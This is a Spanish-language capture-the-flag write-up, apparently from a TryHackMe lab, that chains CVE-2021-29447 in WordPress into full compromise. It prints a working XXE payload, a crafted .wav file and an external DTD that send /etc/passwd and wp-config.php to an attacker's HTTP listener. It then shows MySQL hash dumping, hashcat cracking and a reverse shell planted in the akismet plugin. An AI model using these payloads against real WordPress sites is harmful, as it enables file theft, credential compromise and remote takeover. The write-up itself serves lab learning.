---
tags:
  - Nmap
  - web
  - WordPress
  - CVE-2021-29447
  - XXE
  - mysql
  - hashcat
  - hash-identifier
---


## Introducción 

Las aplicaciones web suelen aceptar y procesar muchos tipos de entrada: formularios, JSON, y a veces archivos con metadatos o estructuras internas (imágenes con metadatos, ficheros multimedia que contienen bloques XML, feeds, etc.). Cuando un servicio parsea XML sin aplicar restricciones a la resolución de entidades externas o al procesamiento de DTDs, se abre la puerta a una clase de fallo conocida como **XXE (XML External Entity)**.ss

## **XXE (XML External Entity) Vulnerability**

**XXE** significa **“XML External Entity”**, y es una vulnerabilidad que ocurre en aplicaciones que procesan **archivos o datos XML** de manera insegura.

Básicamente, cuando una aplicación lee XML sin deshabilitar ciertas funciones peligrosas, un atacante puede **inyectar entidades externas** para que la aplicación lea archivos locales, haga solicitudes internas o incluso ejecute código malicioso.

# Reconocimiento

Ejecutamos un escaneo de reconocimiento con la herramienta `nmap`

```
 Nmap 7.95 scan initiated Thu Aug 14 18:07:16 2025 as: /usr/lib/nmap/nmap --privileged -sV -sS -Pn -p- -sC --top-ports 100 -oN nmap.txt 10.201.89.142
Nmap scan report for 10.201.89.142
Host is up (0.24s latency).
Not shown: 97 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:65:b8:42:b7:c3:ba:8e:fe:e4:3c:cd:57:f1:29:2e (RSA)
|   256 42:1e:1b:8f:19:38:99:2e:36:70:cf:0e:b6:31:92:14 (ECDSA)
|_  256 8e:89:43:de:5d:9b:99:66:c4:2a:93:17:f3:0e:e1:f4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Tryhackme &#8211; Just another WordPress site
|_http-generator: WordPress 5.6.2
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.16.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.16.04.1
|   Thread ID: 7
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, ODBCClient, SupportsCompression, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, FoundRows, LongPassword, ConnectWithDatabase, Support41Auth, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: L\x08?\x1Ah*xHh0Q%=LkB>t'C
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-05-26T21:23:31
|_Not valid after:  2031-05-24T21:23:31
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos expuestos:

`22:ssh`
`80:http`
`3306:mysql`


Procedemos a entrar al panel de login `wordpress` con las credenciales que nos dieron.

![[Pasted image 20250814183538.png]]

## Explotación de CVE-2021-29447 en WordPress

El **CVE-2021-29447** corresponde a una vulnerabilidad en WordPress (reportada en abril 2021) relacionada con el **procesamiento inseguro de metadatos XML en archivos de audio WAVE**.

- Los archivos `.wav` pueden contener un bloque especial llamado **iXML**.
- Este bloque está pensado para guardar metadatos en formato XML (información de grabación, notas, etc.).
- El problema es que WordPress (hasta la versión 5.7.1) usaba una librería que **parseaba ese bloque XML sin restricciones**, lo que significaba que **permitía declaraciones `DOCTYPE` y entidades externas (XXE)**.

 Resultado: un atacante podía subir un `.wav` aparentemente válido, pero con un payload XML incrustado en `iXML`. Cuando WordPress procesaba ese bloque, terminaba ejecutando instrucciones que **podían leer archivos locales** (ej. `/etc/passwd`) o incluso hacer que el servidor hiciera **peticiones HTTP** hacia afuera (SSRF).


# Explotacion

 construí un archivo `.wav` que pareciera legítimo, pero con un payload incrustado en su sección `iXML`.
 
Al generar el archivo, me aseguré de que pasara un test superficial (`file malicioso.wav` lo reconocía como un archivo WAVE válido), lo que confirmaba que, a ojos de WordPress, no levantaría sospechas en el filtro de tipo de archivo.

El contenido embebido en la cabecera XML hacía referencia a una entidad externa (`malicia.dtd`) que yo controlaba. Esta DTD sería la que le daría al parser las instrucciones para acceder a archivos internos del servidor.

```bash
(zikuta㉿zikuta)-[~/Desktop/Wordpress_CVE-2021-29447]
└─$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.23.120.245:4444/malicia.dtd'"'"'>%remote;%init;%trick;]>\x00' > malicioso.wav
                                                                                                                                                                                                                 
┌──(zikuta㉿zikuta)-[~/Desktop/Wordpress_CVE-2021-29447]
└─$ file malicioso.wav
malicioso.wav: RIFF (little-endian) data, WAVE audio
```

### Construcción de la DTD maliciosa

El siguiente paso fue preparar el archivo `malicia.dtd`, que serviría de instrucción remota al parser vulnerable.

En su interior definí:

1. Una entidad `%file` que apuntaba a un recurso local sensible (`/etc/passwd`) usando un stream especial de PHP (`php://filter/...`). Con ello buscaba no solo leer el archivo, sino también obtenerlo en formato legible (codificado en base64 para evitar errores de interpretación).
2. Una entidad `%init` que definía a `%trick`, cuyo objetivo era forzar al parser a enviar el contenido leído hacia mi servidor controlado en `http://10.23.120.245:4444`.

La idea era clara: cuando WordPress procesara el `.wav`, resolvería la DTD, generaría la entidad interna, leería el archivo sensible y finalmente haría una petición HTTP a mi máquina con el contenido embebido como parámetro.

```bash
zikuta㉿zikuta)-[~/Desktop/Wordpress_CVE-2021-29447]
└─$ cat malicia.dtd                                                            
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.23.120.245:4444/?p=%file;'>" >

```


### Observación del comportamiento

Con ambos componentes listos —el `.wav` malicioso y la DTD externa—, el plan estaba completo:

- Subir el archivo `.wav` a la aplicación vulnerable.
- Esperar a que el parser procesara el bloque iXML.
- Revisar en mi listener HTTP si la aplicación hacía la solicitud con el contenido exfiltrado.

Procedemos a subir el archivo malicioso y vamos a abrir un listener http

![[Pasted image 20250814185514.png]]

El servidor se conecta exitosamente y descarga el archivo 

![[Pasted image 20250814185601.png]]

El éxito de esta explotación confirmaba que la instancia de WordPress era vulnerable al **CVE-2021-29447**. La consecuencia inmediata era la exposición de archivos sensibles del sistema (`/etc/passwd` en el ejemplo).

### Exfiltración de `wp-config.php`

Tras confirmar la vulnerabilidad con la lectura inicial de `/etc/passwd`, el siguiente objetivo natural fue intentar acceder al archivo **`/var/www/html/wp-config.php`**, el cual contiene la configuración crítica de WordPress, incluidas las credenciales de acceso a la base de datos. Para ello, ajusté la entidad definida en la DTD externa, de forma que en lugar de apuntar al archivo de sistema, se dirigiera específicamente al fichero de configuración de WordPress.

![[Pasted image 20250814194953.png]]

### Montaje del servidor de escucha

Con la DTD modificada y el archivo `.wav` preparado, configuré un servidor HTTP ligero en Python con el propósito de recibir las conexiones generadas por el parser vulnerable. De esta manera, cualquier intento de resolución de entidades externas realizado por la aplicación sería redirigido hacia mi servidor, entregando así el contenido del archivo solicitado. La conexión se recibió correctamente, lo que validó que la exfiltración estaba funcionando contra el archivo `wp-config.php`.


![[Pasted image 20250814195554.png]]

### Decodificación del contenido recibido

El contenido capturado estaba comprimido y codificado en base64, lo que impedía una lectura directa. Para hacerlo legible, utilice un pequeño script en PHP cuyo propósito era **decodificar primero la cadena en base64 y posteriormente aplicar una descompresión mediante zlib**. Con este proceso, logré obtener el contenido en texto claro del archivo de configuración.

```php
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

### Resultado y hallazgo de credenciales

El resultado final fue la recuperación íntegra del archivo `wp-config.php`, dentro del cual se encontraban las credenciales necesarias para acceder a la base de datos de WordPress. Los valores obtenidos fueron:

- **Usuario**: `thedarktangent`
- **Contraseña**: `sUp3rS3cret123`

![[Pasted image 20250814200917.png]]

- **Usuario**: `thedarktangent`
- **Contraseña**: `sUp3rS3cret123`


Estos datos confirmaban el éxito de la explotación y demostraban el impacto real de la vulnerabilidad, dado que con acceso directo a la base de datos era posible comprometer por completo la aplicación.

## Movimiento lateral hacia la base de datos MySQL

Durante la fase de reconocimiento inicial, el escaneo con **Nmap** ya había revelado que el puerto **3306 (MySQL)** estaba abierto al exterior. Una vez obtenidas las credenciales en texto claro desde `wp-config.php`, el siguiente paso lógico fue comprobar si era posible conectarse directamente a la base de datos utilizando dichas credenciales.


![[Pasted image 20250814201017.png]]

El acceso resultó exitoso, confirmando que el servicio MySQL estaba expuesto y aceptaba autenticación remota con el usuario y la contraseña recuperados. Esto permitió pivotar hacia una fase de enumeración directa de la base de datos.

## Enumeración de la base de datos

Al listar las bases disponibles, se identificó la existencia de **`wordpressdb2`**, que correspondía al entorno de WordPress en uso. Tras acceder a esta base, se procedió a mostrar las tablas existentes y, dentro de ellas, la tabla de **usuarios**.

![[Pasted image 20250814201055.png]]


El contenido de dicha tabla reveló varias cuentas de usuario con sus contraseñas almacenadas en formato hash, tal como es habitual en instalaciones de WordPress. Entre las entradas encontradas destacaban:

- `corp-001` con su hash correspondiente.
- `test-corp` con otro hash de formato similar.

Esto confirmaba que las contraseñas estaban protegidas mediante el mecanismo estándar de WordPress.

![[Pasted image 20250814201130.png]]

## Identificación del tipo de hash

Para determinar el algoritmo exacto utilizado, se empleó la herramienta **hash-identifier**, la cual reconoció los hashes con prefijo `$P$` como pertenecientes a **WordPress (Portable PHP password hashing framework)**, basado en **MD5 con múltiples rondas**.

El resultado de la herramienta fue concluyente:

- **Tipo de hash:** WordPress MD5 ($P$).

```bash
──(zikuta㉿zikuta)-[~/Desktop/Wordpress_CVE-2021-29447]
└─$ hash-identifier                                   
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1

Possible Hashs:
[+] MD5(Wordpress)
```


## Crackeo de los hashes

Con el tipo de hash identificado, el paso siguiente fue proceder a la fase de crackeo. Para ello se utilizó **Hashcat**, seleccionando el modo apropiado para hashes de WordPress (`-m 400`). Como diccionario se empleó la clásica **rockyou.txt**, ampliamente usada en retos de CTF debido a su cobertura de contraseñas comunes.


```bash
──(zikuta㉿zikuta)-[~/Desktop/Wordpress_CVE-2021-29447]
└─$ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt  
```

Resultado:

Password: `teddybear` 

Tras un tiempo de procesamiento, Hashcat logró descifrar los hashes, revelando las contraseñas en texto claro asociadas a las cuentas de usuario obtenidas de la base de datos.

## Obtención de acceso remoto mediante reverse shell

Tras haber descifrado las credenciales del usuario administrador de WordPress, fue posible acceder al panel administrativo con privilegios completos. Con este nivel de acceso, uno de los vectores más directos para obtener ejecución remota es la **edición de plugins**: al modificar un archivo PHP dentro de un plugin legítimo, se puede inyectar código arbitrario que será ejecutado por el servidor web al cargar dicho recurso.

![[Pasted image 20250814201824.png]]

En este caso, el archivo objetivo fue `akismet.php`, correspondiente a un plugin instalado en el entorno. Allí se insertó un fragmento de código PHP diseñado para establecer una **reverse shell**, lo que permitiría conectarse de manera interactiva con el sistema subyacente.

![[Pasted image 20250814202137.png]]

## Preparación del entorno de escucha

Antes de activar el payload, se levantó un listener en el host de ataque utilizando **Netcat** en el puerto previamente definido. Esto garantizaría que, en el momento en que el servidor web ejecutara el código inyectado, la conexión sería redirigida hacia el atacante, estableciendo un canal de comunicación directo con la máquina víctima.

## Activación de la shell remota

Con el listener en espera, se accedió de manera remota a la ruta del plugin modificado:

```bash
http://10.201.89.142/wp-content/plugins/akismet/akismet.php
```

Al cargar dicho recurso, el servidor procesó el código malicioso y estableció con éxito la conexión hacia el host de ataque. En la consola del atacante se reflejó la recepción de la reverse shell, mostrando información del sistema operativo, la versión del kernel y confirmando que el acceso se obtenía bajo el contexto del usuario del servicio web:

```bash
─(zikuta㉿zikuta)-[~/Desktop/Wordpress_CVE-2021-29447]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.23.120.245] from (UNKNOWN) [10.201.89.142] 37588
Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 18:23:33 up  2:21,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


y listo!! estamos dentro

![[Pasted image 20250814202642.png]]


## Impacto y conclusión

Este acceso confirmó un control total sobre la máquina comprometida. Desde el rol **www-data**, el atacante disponía de un punto de entrada directo al sistema operativo, lo que representaba una **toma completa del entorno WordPress**.

En el contexto del CTF, este era el último paso requerido para proceder a la lectura de la **flag**, consolidando así toda la cadena de explotación:

1. Abuso del **CVE-2021-29447** para exfiltrar `wp-config.php`.
2. Uso de credenciales obtenidas para pivotar hacia **MySQL** y extraer hashes de usuarios.
3. **Crackeo** de contraseñas y acceso al panel de administración de WordPress.
4. Inserción de **reverse shell** en un plugin con privilegios administrativos.
5. Establecimiento de acceso remoto al servidor como **www-data**.
6. Lectura final de la **flag** como objetivo del reto.


# Tecnicas Utilizadas

| Fase                              | Técnica empleada                                          | Descripción                                                                                                    |
| --------------------------------- | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| **Reconocimiento**                | Escaneo de puertos con **Nmap**                           | Identificación de servicios expuestos (HTTP en 80/443 y MySQL en 3306).                                        |
| **Explotación inicial**           | **XXE (XML External Entity)** — CVE-2021-29447            | Creación de un archivo `.wav` con bloque iXML malicioso que permitió la exfiltración de archivos locales.      |
| **Ejecución remota**              | Carga de **DTD externa**                                  | Uso de una DTD controlada para instruir al parser vulnerable a leer archivos (`/etc/passwd`, `wp-config.php`). |
| **Acceso a credenciales**         | Extracción de `wp-config.php`                             | Obtención de usuario y contraseña de la base de datos almacenados en la configuración de WordPress.            |
| **Movimiento lateral**            | Conexión a **MySQL** en 3306                              | Uso de credenciales exfiltradas para conectarse remotamente a la base de datos.                                |
| **Credential Access**             | Enumeración de tabla `usuarios` en la base `wordpressdb2` | Extracción de hashes de contraseñas de usuarios de WordPress.                                                  |
| **Cracking offline**              | **Hashcat (modo 400)** + diccionario `rockyou.txt`        | Descifrado de los hashes `$P$` (WordPress MD5 salted) para obtener credenciales en texto claro.                |
| **Persistence / Privilege Abuse** | **Acceso al panel administrativo de WordPress**           | Uso de credenciales crackeadas para autenticarse como administrador.                                           |
| **Ejecución remota**              | Inyección de **reverse shell en un plugin PHP**           | Modificación de un plugin existente para ejecutar código malicioso.                                            |
| **Command & Control**             | **Reverse shell con Netcat**                              | Establecimiento de una conexión interactiva al sistema como usuario `www-data`.                                |
| **Impacto final**                 | Lectura de la **flag**                                    | Confirmación del compromiso completo del entorno.                                                              |



